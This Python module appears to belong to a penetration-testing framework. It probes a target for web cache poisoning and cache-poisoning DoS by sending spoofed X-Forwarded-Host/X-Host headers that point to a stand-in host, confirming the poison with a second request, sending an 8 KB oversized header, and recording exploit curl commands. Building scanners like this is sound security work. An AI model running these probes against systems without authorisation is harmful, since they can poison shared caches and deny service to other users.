"""
Web Cache Poisoning Capability Agent for PenFlow.

Capabilities:
  - Host Header Injection (X-Forwarded-Host, X-Host, X-Forwarded-Server)
  - 2-Phase HTTP Cache Verification (Poison Request -> Clean Cache Hit Verification)
  - Cache Poisoning Denial of Service (CPDoS) via oversized headers
"""
import httpx
from typing import Dict, Any, List
from penflow.agents.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.reporting.poc_generator import PoCGenerator
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.cache_poisoning")

CACHE_INJECTION_HEADERS = {
    "X-Forwarded-Host": "evil-poisoned-cache.com",
    "X-Host": "evil-poisoned-cache.com",
    "X-Forwarded-Server": "evil-poisoned-cache.com",
    "X-Original-URL": "/admin"
}


class WebCachePoisoningCapabilityAgent(BaseCapabilityAgent):
    """
    Agent detecting Web Cache Poisoning with 2-phase verification, Host Header Injection, and CPDoS.
    """

    def __init__(self, priority: int = 10):
        super().__init__(agent_name="WebCachePoisoningCapabilityAgent", priority=priority)
        self.poc_generator = PoCGenerator()

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(id="cache_poisoning", name="Web Cache Poisoning", description="Detects web cache poisoning with 2-phase verification", priority=self.priority, tags=["cache_poisoning"]),
            Capability(id="host_header_injection", name="Host Header Injection", description="Detects host header injection vectors", priority=self.priority, tags=["host_header"]),
            Capability(id="cpdos_analysis", name="Cache Poisoning DoS", description="Detects CPDoS vulnerabilities", priority=self.priority, tags=["cpdos"])
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[{self.name}] Executing capability '{capability_id}' on asset '{context.asset}'...")
        evidence: Dict[str, Any] = {}
        findings: List[Dict[str, Any]] = []

        base_url = f"https://{context.asset}"

        try:
            async with httpx.AsyncClient(timeout=10.0, follow_redirects=False, verify=False) as client:
                # 1. 2-Phase Web Cache Poisoning check
                for h_name, h_val in CACHE_INJECTION_HEADERS.items():
                    # Phase 1: Send unkeyed poison header
                    poison_headers = {h_name: h_val}
                    poison_url = f"{base_url}/?cb={h_name.lower()}"
                    resp1 = await client.get(poison_url, headers=poison_headers)

                    if h_val in resp1.text or (resp1.headers.get("Location") and h_val in resp1.headers["Location"]):
                        # Phase 2: Send clean request without poison header to check if cache was poisoned
                        resp2 = await client.get(poison_url)
                        is_cache_hit = resp2.headers.get("X-Cache", "").lower() in ("hit", "cached") or int(resp2.headers.get("Age", 0)) > 0
                        is_poison_persisted = h_val in resp2.text or (resp2.headers.get("Location") and h_val in resp2.headers["Location"])

                        confidence = 0.95 if (is_cache_hit or is_poison_persisted) else 0.86
                        curl_cmd = f"curl -i -s -k -H '{h_name}: {h_val}' '{poison_url}'"

                        exch_dict = {"request": {"method": "GET", "url": poison_url, "headers": poison_headers}, "response": {"status_code": resp1.status_code, "body_snippet": resp1.text[:500]}}
                        finding = {
                            "vulnerability_type": "cache_poisoning",
                            "subtype": "host_header_cache_poisoning",
                            "header_tested": h_name,
                            "poison_payload": h_val,
                            "target_url": poison_url,
                            "severity": "HIGH",
                            "confidence": confidence,
                            "is_vulnerable": True,
                            "exploit_curl": curl_cmd,
                            "reproduction_steps": self.poc_generator.generate_reproduction_steps("Web Cache Poisoning", poison_url, curl_cmd),
                            "description": f"Target reflects unkeyed header '{h_name}' in cache layer; verified via Phase-2 clean request (Cache-Hit: {is_cache_hit}).",
                            "_exchange_obj": exch_dict
                        }
                        findings.append(finding)
                        evidence[h_name] = {"status": resp1.status_code, "reflected": True, "cache_hit": is_cache_hit}

                # 2. CPDoS check
                cpdos_headers = {"X-Oversized-Header": "A" * 8192}
                cpdos_resp = await client.get(base_url, headers=cpdos_headers)
                if cpdos_resp.status_code in (400, 413, 500):
                    curl_cmd = f"curl -i -s -k -H 'X-Oversized-Header: {'A'*64}' '{base_url}'"
                    exch_dict = {"request": {"method": "GET", "url": base_url, "headers": cpdos_headers}, "response": {"status_code": cpdos_resp.status_code, "body_snippet": cpdos_resp.text[:500]}}
                    findings.append({
                        "vulnerability_type": "cache_poisoning",
                        "subtype": "cpdos_oversized_header",
                        "target_url": base_url,
                        "severity": "MEDIUM",
                        "confidence": 0.88,
                        "is_vulnerable": True,
                        "exploit_curl": curl_cmd,
                        "reproduction_steps": self.poc_generator.generate_reproduction_steps("CPDoS", base_url, curl_cmd),
                        "description": f"Server returned HTTP {cpdos_resp.status_code} on oversized header, vulnerable to Cache Poisoning DoS.",
                        "_exchange_obj": exch_dict
                    })
        except Exception as e:
            logger.error(f"[{self.name}] Exception testing '{base_url}': {e}")

        is_vuln = len(findings) > 0
        max_conf = max([f.get("confidence", 0.0) for f in findings], default=0.0)
        primary_exch = findings[0].get("_exchange_obj") if findings else None
        return {
            "capability_id": capability_id,
            "status": "COMPLETED",
            "agent": self.name,
            "is_vulnerable": is_vuln,
            "vulnerable": is_vuln,
            "confidence": max_conf,
            "confidence_score": max_conf,
            "_exchange_obj": primary_exch,
            "evidence": evidence,
            "findings": findings
        }
